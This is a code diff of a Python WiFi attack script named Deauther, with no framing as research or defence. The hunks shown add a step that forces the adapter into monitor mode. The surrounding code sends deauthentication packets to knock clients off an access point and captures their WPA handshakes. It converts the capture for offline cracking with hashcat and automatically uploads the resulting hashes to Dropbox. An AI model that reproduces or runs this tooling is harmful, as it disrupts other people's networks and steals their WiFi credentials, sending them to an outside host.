@@ -28,6 +28,28 @@ class bcolors:
 packet_list = []
 
 
+def check_monitor(iface):
+    monitor = subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True)
+
+    def _try_monitor():
+        subprocess.call('ip link set %s down' % iface, shell=True)
+        subprocess.call('iw dev %s set type monitor' % iface, shell=True)
+        subprocess.call('ip link set %s up' % iface, shell=True)
+        if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode().strip()\
+                != "monitor":
+            print('Failed to set %s monitor mode. Exiting..' % iface)
+            sys.exit()
+
+    if monitor.decode().strip() != "monitor":
+        print('WiFi Device not in monitor mode!')
+        answer = input('Let Deauther try to put WiFi interface into monitor mode?(y/n)')
+        if answer == 'y':
+            _try_monitor()
+        else:
+            print('Exiting..')
+            sys.exit()
+
+
 def is_root():
     if os.geteuid() != 0:
         print("This Program must run with root privileges, Exiting...")
@@ -84,7 +106,7 @@ def send_deauth_packet():
 
 
 def dropbox_uploader():
-    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
     rootdir = os.getcwd()
     print("Attempting to upload...")
     for dir, dirs, files in os.walk(rootdir):
@@ -106,6 +128,7 @@ def dropbox_uploader():
 if __name__ == '__main__':
     is_root()
     iface, ap, client, channel, deauth_count, pcap_file = check_args()
+    check_monitor(iface)
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
     # current time in the middle of pcap file name
     os.system('iwconfig %s channel %s' % (iface, channel))  # Set WiFi Adapter On right Channel
@@ -116,6 +139,6 @@ if __name__ == '__main__':
     print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
     t.join()
     print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" % (len(packet_list)), '\n')
-    print('Packets Written to: %s' % (os.getcwd()+'/'+pcap_file))
+    print('Packets Written to: %s' % (os.getcwd() + '/' + pcap_file))
     cap_converter()  # Function that converts pcap to hashcat 22000 mode.
     dropbox_uploader()  # Automatic hash uploader
